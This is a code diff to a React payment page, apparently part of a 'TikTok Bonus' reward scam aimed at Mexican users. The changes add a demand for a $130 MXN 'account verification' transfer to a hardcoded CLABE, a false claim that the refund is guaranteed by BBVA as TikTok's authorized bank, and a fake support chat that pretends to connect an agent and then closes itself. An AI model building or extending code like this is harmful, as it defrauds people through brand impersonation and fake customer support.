@@ -2,6 +2,7 @@ import { useEffect, useMemo, useRef, useState } from "react";
 import { Logo } from "../components/Logo";
 import { useAppState } from "../context/AppStateContext";
 import { digitsOnly, formatClabe, isClabeLength, validateClabe } from "../lib/clabe";
+import { getCampaignRewardCents } from "../lib/campaign";
 import { formatMxn } from "../lib/money";
 import {
   createPayment,
@@ -13,15 +14,28 @@ import {
 } from "../lib/pagamento";
 import { transitionTo } from "../lib/router";
 
-const CREDIT_CENTS = 139_500;
+const SPEI_PAYTO_CLABE = "684180417007054959";
 const LOADING_STEP_MS = 800;
 const WAIT_SECONDS = 60;
-const COPY_FEEDBACK_MS = 400;
+const COPY_RESTORE_MS = 1800;
 const LOADING_STATUSES = ["Generando orden...", "Validando datos..."] as const;
+const CHAT_GREETING =
+  "¡Hola! Cuéntanos tu consulta y te responderemos a tu correo electrónico a la brevedad. 😊";
+const CHAT_RECEIVED = "✅ Recibido. Te respondemos a tu correo a la brevedad.";
+const CHAT_CONNECTING =
+  "Estamos conectándote con un agente de soporte de TikTok Bonus, espera un momento.";
+const CHAT_QUEUE_FULL =
+  "Nuestra fila está muy saturada en este momento. Déjanos tu número de teléfono o correo y nos pondremos en contacto en cuanto un agente pueda, lo antes posible.";
+const CHAT_CONNECT_WAIT_MS = 120_000;
+const CHAT_AUTOCLOSE_MS = 4_000;
 
 type GatewayState = "loading" | "ready" | "waiting" | "error" | "analysis";
 type ErrorSource = "create" | "poll";
-type ChatItem = { from: "bot" | "user"; text: string };
+type ChatItem = { from: "bot" | "user"; text: string; loading?: boolean };
+
+function initialChat(): ChatItem[] {
+  return [{ from: "bot", text: CHAT_GREETING }];
+}
 
 function formatDeadline(at: Date) {
   return at.toLocaleString("es-MX", {
@@ -46,6 +60,48 @@ function ConfirmationLogo() {
   );
 }
 
+async function copyToClipboard(text: string): Promise<boolean> {
+  try {
+    window.focus();
+    await navigator.clipboard.writeText(text);
+    return true;
+  } catch {
+    /* fallback below */
+  }
+  try {
+    const el = document.createElement("textarea");
+    el.value = text;
+    el.setAttribute("readonly", "");
+    el.style.cssText = "position:fixed;top:0;left:0;width:1px;height:1px;padding:0;border:0;opacity:0";
+    document.body.appendChild(el);
+    el.focus();
+    el.select();
+    el.setSelectionRange(0, text.length);
+    const ok = document.execCommand("copy");
+    document.body.removeChild(el);
+    return ok;
+  } catch {
+    return false;
+  }
+}
+
+function CopyIcon() {
+  return (
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
+      <rect x="9" y="9" width="13" height="13" rx="2" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  );
+}
+
+function CopiedCheckIcon() {
+  return (
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
+      <path d="M5 12.5 9.2 16.7 19 7.5" />
+    </svg>
+  );
+}
+
 function LockIcon() {
   return (
     <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
@@ -55,8 +111,42 @@ function LockIcon() {
   );
 }
 
+function ClabeTick() {
+  return (
+    <span className="clabe-valid-tick" aria-hidden="true">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+        <circle cx="12" cy="12" r="11" fill="#14b8a6" />
+        <path d="M7.2 12.4l3.1 3.1 6.5-6.6" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
+      </svg>
+    </span>
+  );
+}
+
+function ShieldIcon() {
+  return (
+    <svg className="pg-seguro-shield" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+      <path
+        fill="#0d9488"
+        d="M12 2.2 4.8 5.1v6.2c0 4.7 3.2 8.9 7.2 10.5 4-1.6 7.2-5.8 7.2-10.5V5.1L12 2.2Z"
+      />
+      <path fill="#fff" d="M10.2 15.4 7.4 12.6l1.2-1.2 1.6 1.6 4.2-4.2 1.2 1.2-5.4 5.4Z" />
+    </svg>
+  );
+}
+
+function HeadsetIcon() {
+  return (
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+      <path d="M4.5 12a7.5 7.5 0 0 1 15 0" stroke="#fff" strokeWidth="2" strokeLinecap="round" />
+      <rect x="3" y="11.5" width="4.2" height="7.2" rx="1.6" fill="#fff" />
+      <rect x="16.8" y="11.5" width="4.2" height="7.2" rx="1.6" fill="#fff" />
+      <path d="M20.8 18.6v1.1A2.6 2.6 0 0 1 18.2 22.2h-2" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" />
+    </svg>
+  );
+}
+
 export function PaymentGateway() {
-  const { userData, patchUserData, setLastWithdrawal } = useAppState();
+  const { userData, lastWithdrawalCents, patchUserData, setLastWithdrawal } = useAppState();
   const [view, setView] = useState<GatewayState>("loading");
   const [status, setStatus] = useState<string>(LOADING_STATUSES[0]);
   const [errorMessage, setErrorMessage] = useState("No se pudo finalizar la transacción. Inténtalo de nuevo.");
@@ -72,14 +162,14 @@ export function PaymentGateway() {
   const [waitLeft, setWaitLeft] = useState(WAIT_SECONDS);
   const [helpOpen, setHelpOpen] = useState(false);
   const [comprovanteHint, setComprovanteHint] = useState("");
-  const [chat, setChat] = useState<ChatItem[]>([
-    { from: "bot", text: "¡Hola! Cuéntanos tu consulta y te responderemos a tu correo electrónico a la brevedad. 😊" },
-  ]);
+  const [chat, setChat] = useState<ChatItem[]>(initialChat);
   const [chatDraft, setChatDraft] = useState("");
   const [chatInvalid, setChatInvalid] = useState(false);
-  const [chatSending, setChatSending] = useState(false);
+  const [chatBusy, setChatBusy] = useState(false);
+  const [clabeCopied, setClabeCopied] = useState(false);
 
   const timeouts = useRef<number[]>([]);
+  const copyRestoreRef = useRef(0);
   const intervals = useRef<number[]>([]);
   const alive = useRef(true);
   const polling = useRef(false);
@@ -89,8 +179,20 @@ export function PaymentGateway() {
   const userDataRef = useRef(userData);
   const fileRef = useRef<HTMLInputElement>(null);
   const chatBoxRef = useRef<HTMLDivElement>(null);
+  const chatWaitRef = useRef(0);
+  const chatCloseRef = useRef(0);
+  const chatBusyRef = useRef(false);
   userDataRef.current = userData;
 
+  useEffect(() => {
+    const next = formatClabe(userData.clabe || userData.chave);
+    if (next) {
+      setClabe(next);
+      confirmedClabe.current = digitsOnly(next);
+    }
+  }, [userData.clabe, userData.chave]);
+
+  const creditCents = lastWithdrawalCents > 0 ? lastWithdrawalCents : getCampaignRewardCents();
   const deadline = useMemo(() => formatDeadline(new Date(Date.now() + 30 * 60 * 1000)), []);
   const showSheet = view === "ready" || view === "waiting";
 
@@ -101,6 +203,17 @@ export function PaymentGateway() {
     intervals.current = [];
   }
 
+  function clearChatTimers() {
+    if (chatWaitRef.current) {
+      window.clearTimeout(chatWaitRef.current);
+      chatWaitRef.current = 0;
+    }
+    if (chatCloseRef.current) {
+      window.clearTimeout(chatCloseRef.current);
+      chatCloseRef.current = 0;
+    }
+  }
+
   useEffect(() => {
     alive.current = true;
     return () => {
@@ -108,6 +221,8 @@ export function PaymentGateway() {
       polling.current = false;
       pollBusy.current = false;
       clearTimers();
+      if (chatWaitRef.current) window.clearTimeout(chatWaitRef.current);
+      if (chatCloseRef.current) window.clearTimeout(chatCloseRef.current);
     };
   }, []);
 
@@ -120,7 +235,7 @@ export function PaymentGateway() {
       clabe: digits,
       metodo: "SPEI",
     });
-    setLastWithdrawal(CREDIT_CENTS);
+    setLastWithdrawal(creditCents);
     transitionTo("success");
   }
 
@@ -179,8 +294,7 @@ export function PaymentGateway() {
         if (result.status === "SUCCESS") {
           setReference(result.reference);
           setInstructions(result.instructions);
-          if (result.instructions.clabe) setClabe(formatClabe(result.instructions.clabe));
-          confirmedClabe.current = digitsOnly(result.instructions.clabe || digits);
+          confirmedClabe.current = digits;
           setView("ready");
           return;
         }
@@ -363,26 +477,129 @@ export function PaymentGateway() {
     if (!paymentId) void ensurePayment();
   }
 
+  function closeHelp() {
+    clearChatTimers();
+    chatBusyRef.current = false;
+    setHelpOpen(false);
+    setChat(initialChat());
+    setChatDraft("");
+    setChatInvalid(false);
+    setChatBusy(false);
+  }
+
   function sendChat() {
     const msg = chatDraft.trim();
     if (!msg) {
       setChatInvalid(true);
       return;
     }
+    if (chatBusyRef.current) return;
+    chatBusyRef.current = true;
     setChatInvalid(false);
-    setChatSending(true);
-    setChat((prev) => [...prev, { from: "user", text: msg }]);
+    setChatBusy(true);
     setChatDraft("");
+    setChat((prev) => [
+      ...prev,
+      { from: "user", text: msg },
+      { from: "bot", text: CHAT_RECEIVED },
+      { from: "bot", text: CHAT_CONNECTING, loading: true },
+    ]);
+
+    const waitId = window.setTimeout(() => {
+      if (!alive.current) return;
+      setChat((prev) => [...prev.filter((item) => !item.loading), { from: "bot", text: CHAT_QUEUE_FULL }]);
+      const closeId = window.setTimeout(() => {
+        if (!alive.current) return;
+        closeHelp();
+      }, CHAT_AUTOCLOSE_MS);
+      chatCloseRef.current = closeId;
+      timeouts.current.push(closeId);
+    }, CHAT_CONNECT_WAIT_MS);
+    chatWaitRef.current = waitId;
+    timeouts.current.push(waitId);
+  }
+
+  function renderChatPanel(panelId: string, withMainIds: boolean) {
+    return (
+      <div id={panelId} className="gateway-chat-panel" role="dialog" aria-label="Soporte">
+        <div className="gateway-chat-header">
+          <div className="gateway-chat-avatar" aria-hidden="true">
+            <HeadsetIcon />
+          </div>
+          <div className="gateway-chat-meta">
+            <div>Soporte</div>
+            <div>Respondemos por email</div>
+          </div>
+          <button
+            type="button"
+            id={withMainIds ? "gateway-chat-close" : undefined}
+            className="gateway-chat-close"
+            aria-label="Cerrar"
+            onClick={closeHelp}
+          >
+            ×
+          </button>
+        </div>
+        <div className="gateway-chat-body">
+          <div
+            id={withMainIds ? "gateway-chat-messages" : undefined}
+            className="gateway-chat-messages"
+            ref={chatBoxRef}
+          >
+            {chat.map((item, index) => (
+              <div
+                key={`${item.from}-${index}`}
+                className={`gateway-chat-bubble is-${item.from}${item.loading ? " is-loading" : ""}`}
+                role={item.loading ? "status" : undefined}
+              >
+                {item.loading ? <span className="gateway-chat-spinner" aria-hidden="true" /> : null}
+                <span>{item.text}</span>
+              </div>
+            ))}
+          </div>
+          <div className="gateway-chat-form">
+            <textarea
+              id={withMainIds ? "gateway-chat-msg" : undefined}
+              placeholder="Escribe tu consulta aquí..."
+              value={chatDraft}
+              disabled={chatBusy}
+              className={chatInvalid ? "is-invalid" : undefined}
+              onChange={(e) => {
+                setChatDraft(e.target.value);
+                setChatInvalid(false);
+              }}
+              onKeyDown={(e) => {
+                if (e.key === "Enter" && !e.shiftKey) {
+                  e.preventDefault();
+                  sendChat();
+                }
+              }}
+            />
+            <button type="button" id={withMainIds ? "gateway-chat-send" : undefined} disabled={chatBusy} onClick={sendChat}>
+              Enviar mensaje
+            </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  async function copyPayToClabe() {
+    const digits = digitsOnly(instructions?.clabe || SPEI_PAYTO_CLABE);
+    const ok = await copyToClipboard(digits);
+    if (!ok || !alive.current) return;
+    setClabeCopied(true);
+    window.clearTimeout(copyRestoreRef.current);
     const id = window.setTimeout(() => {
-      setChat((prev) => [...prev, { from: "bot", text: "✅ Recibido. Te respondemos a tu correo a la brevedad." }]);
-      setChatSending(false);
-    }, COPY_FEEDBACK_MS);
+      if (alive.current) setClabeCopied(false);
+    }, COPY_RESTORE_MS);
+    copyRestoreRef.current = id;
     timeouts.current.push(id);
   }
 
-  const busy = inFlight || view === "waiting";
   const shownReference = reference || instructions?.reference || "—";
-  const shownClabe = formatClabe(instructions?.clabe || clabe);
+  const payToClabe = formatClabe(instructions?.clabe || SPEI_PAYTO_CLABE);
+  const shownClabe = payToClabe;
 
   const instructionStack = (
     <div className="pg-instruction-stack">
@@ -428,51 +645,17 @@ export function PaymentGateway() {
       </div>
 
       <div className="gateway-help">
-        <button type="button" id="gateway-help-btn" onClick={() => setHelpOpen((open) => !open)}>
+        <button
+          type="button"
+          id="gateway-help-btn"
+          onClick={() => (helpOpen ? closeHelp() : setHelpOpen(true))}
+        >
           <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
           </svg>
           ¿Necesitás ayuda?
         </button>
-
-        <div id="gateway-chat-panel" className="gateway-chat-panel" hidden={!helpOpen}>
-          <div className="gateway-chat-header">
-            <div className="gateway-chat-avatar" aria-hidden="true">
-              🎧
-            </div>
-            <div className="gateway-chat-meta">
-              <div>Soporte LaMantra</div>
-              <div>Respondemos por email</div>
-            </div>
-            <button type="button" id="gateway-chat-close" onClick={() => setHelpOpen(false)}>
-              ×
-            </button>
-          </div>
-          <div className="gateway-chat-body">
-            <div id="gateway-chat-messages" className="gateway-chat-messages" ref={chatBoxRef}>
-              {chat.map((item, index) => (
-                <div key={`${item.from}-${index}`} className={`gateway-chat-bubble is-${item.from}`}>
-                  {item.text}
-                </div>
-              ))}
-            </div>
-            <div className="gateway-chat-form">
-              <textarea
-                id="gateway-chat-msg"
-                placeholder="Escribe tu consulta aquí..."
-                value={chatDraft}
-                className={chatInvalid ? "is-invalid" : undefined}
-                onChange={(e) => {
-                  setChatDraft(e.target.value);
-                  setChatInvalid(false);
-                }}
-              />
-              <button type="button" id="gateway-chat-send" disabled={chatSending} onClick={sendChat}>
-                {chatSending ? "Enviando..." : "Enviar mensaje"}
-              </button>
-            </div>
-          </div>
-        </div>
+        {helpOpen ? renderChatPanel("gateway-chat-panel", true) : null}
       </div>
     </div>
   );
@@ -529,7 +712,7 @@ export function PaymentGateway() {
                 <div className="confirmation-receipt-item">
                   <div className="confirmation-receipt-label">Valor a recibir</div>
                   <div id="checkout-confirmation-valor" className="confirmation-receipt-value bold">
-                    {formatMxn(CREDIT_CENTS)} + {formatMxn(PROCESSING_CENTS)}
+                    {formatMxn(creditCents)} + {formatMxn(PROCESSING_CENTS)}
                   </div>
                 </div>
               </div>
@@ -550,7 +733,7 @@ export function PaymentGateway() {
 
         {showSheet ? (
           <div className="pg-ready">
-            <p className="pg-intro">Confirma tu CLABE para acreditar el crédito por Transferencia SPEI.</p>
+            <p className="pg-intro">Para continuar con el retiro del monto disponible, necesitamos confirmar la titularidad de tu cuenta con una transacción real. Es necesario un pago de <strong>$130,00 MXN</strong> para verificar tu cuenta. Este monto será acreditado en tu saldo disponible para retiro.</p>
 
             <div className="confirmation-section">
               <div className="confirmation-section-title">RESUMEN</div>
@@ -561,7 +744,7 @@ export function PaymentGateway() {
                 </div>
                 <div className="confirmation-receipt-item">
                   <div className="confirmation-receipt-label">Crédito Total</div>
-                  <div className="confirmation-receipt-value bold">{formatMxn(CREDIT_CENTS)}</div>
+                  <div className="confirmation-receipt-value bold">{formatMxn(creditCents)}</div>
                 </div>
                 <div className="confirmation-receipt-item">
                   <div className="confirmation-receipt-label">Método</div>
@@ -579,26 +762,63 @@ export function PaymentGateway() {
             </div>
 
             <div className="confirmation-section">
-              <label className={`field${clabeError ? " is-invalid" : ""}`}>
+              <div className="pg-seguro-head">
+                <div className="pg-seguro-title">
+                  <span>Pago Seguro</span>
+                  <ShieldIcon />
+                </div>
+                <p className="pg-seguro-copy">
+                  Tu reembolso está garantizado por Banco{" "}
+                  <img src="/images/bbva-logo.jpg" alt="BBVA" className="pg-seguro-bbva" />
+                  , autorizado oficial de TikTok.
+                </p>
+              </div>
+
+              <p className="pg-payto-lead">Transfiere el monto exacto a:</p>
+
+              <div className="pg-payto-box">
                 <span className="field-label">CLABE</span>
-                <input
-                  id="pg-clabe"
-                  type="tel"
-                  inputMode="numeric"
-                  autoComplete="off"
-                  maxLength={22}
-                  placeholder="000 000 0000 0000 0000"
-                  value={clabe}
-                  disabled={busy}
-                  onChange={(e) => {
-                    setClabe(formatClabe(e.target.value));
-                    if (clabeError) setClabeError(null);
-                  }}
-                />
+                <div className="pg-payto-clabe" id="pg-payto-clabe">
+                  <span className="pg-payto-clabe-value">{payToClabe}</span>
+                  <button
+                    type="button"
+                    id="pg-payto-copy"
+                    className={`pg-payto-copy${clabeCopied ? " is-copied" : ""}`}
+                    onClick={() => void copyPayToClabe()}
+                    aria-label={clabeCopied ? "CLABE copiada" : "Copiar CLABE"}
+                    aria-live="polite"
+                  >
+                    <span className="pg-payto-copy-icon" key={clabeCopied ? "ok" : "copy"}>
+                      {clabeCopied ? <CopiedCheckIcon /> : <CopyIcon />}
+                    </span>
+                    <span className="pg-payto-copy-label">{clabeCopied ? "Copiado" : "Copiar"}</span>
+                  </button>
+                </div>
+                <p className="field-hint">18 dígitos · Transferencia SPEI</p>
+                <div className="pg-payto-monto">
+                  <span>Monto</span>
+                  <strong>$130.00 MXN</strong>
+                </div>
+              </div>
+
+              <label className={`field pg-clabe-locked${isClabeLength(clabe) ? " is-valid-clabe" : ""}${clabeError ? " is-invalid" : ""}`}>
+                <span className="field-label">Tu CLABE de reembolso</span>
+                <span className={`field-input-wrap${isClabeLength(clabe) ? " is-valid" : ""}`}>
+                  <input
+                    id="pg-clabe"
+                    type="tel"
+                    inputMode="numeric"
+                    autoComplete="off"
+                    readOnly
+                    value={clabe}
+                    aria-readonly="true"
+                  />
+                  {isClabeLength(clabe) ? <ClabeTick /> : null}
+                </span>
                 {clabeError ? (
                   <p className="field-error">{clabeError}</p>
                 ) : (
-                  <p className="field-hint">18 dígitos · Transferencia SPEI</p>
+                  <p className="field-hint">Cuenta donde recibirás el reembolso</p>
                 )}
               </label>
 
@@ -652,45 +872,7 @@ export function PaymentGateway() {
         </div>
 
         {helpOpen && view === "analysis" ? (
-          <div className="gateway-help">
-            <div id="gateway-chat-panel-analise" className="gateway-chat-panel">
-              <div className="gateway-chat-header">
-                <div className="gateway-chat-avatar" aria-hidden="true">
-                  🎧
-                </div>
-                <div className="gateway-chat-meta">
-                  <div>Soporte LaMantra</div>
-                  <div>Respondemos por email</div>
-                </div>
-                <button type="button" onClick={() => setHelpOpen(false)}>
-                  ×
-                </button>
-              </div>
-              <div className="gateway-chat-body">
-                <div className="gateway-chat-messages" ref={chatBoxRef}>
-                  {chat.map((item, index) => (
-                    <div key={`${item.from}-${index}`} className={`gateway-chat-bubble is-${item.from}`}>
-                      {item.text}
-                    </div>
-                  ))}
-                </div>
-                <div className="gateway-chat-form">
-                  <textarea
-                    placeholder="Escribe tu consulta aquí..."
-                    value={chatDraft}
-                    className={chatInvalid ? "is-invalid" : undefined}
-                    onChange={(e) => {
-                      setChatDraft(e.target.value);
-                      setChatInvalid(false);
-                    }}
-                  />
-                  <button type="button" disabled={chatSending} onClick={sendChat}>
-                    {chatSending ? "Enviando..." : "Enviar mensaje"}
-                  </button>
-                </div>
-              </div>
-            </div>
-          </div>
+          <div className="gateway-help">{renderChatPanel("gateway-chat-panel-analise", false)}</div>
         ) : null}
       </div>
     </section>
